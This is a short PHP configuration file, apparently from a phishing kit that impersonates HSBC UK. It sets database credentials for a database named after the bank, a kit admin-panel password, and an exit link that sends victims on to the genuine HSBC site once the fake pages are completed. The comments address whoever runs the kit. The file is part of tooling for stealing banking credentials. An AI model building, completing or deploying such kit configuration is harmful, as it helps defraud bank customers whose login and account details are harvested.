<?php
error_reporting(0);
$servername = "localhost";
$database = "hsbc_uk_live_rbxndz";
$username = "root";
$password = "123456-abcdef";

// admin panel password
$admin_panel_password = "1234"; // make sure to change this one

// exit link when errors or when page completed [i made it redirect to the login page again u can change that anytime obvisoly]
$exit_link = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiFooGW7NDoAhWp6uAKHb0dC64QFjAAegQIIRAC&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AOvVaw3Rs_H4lNwhvYbSxquKsKYe";
?>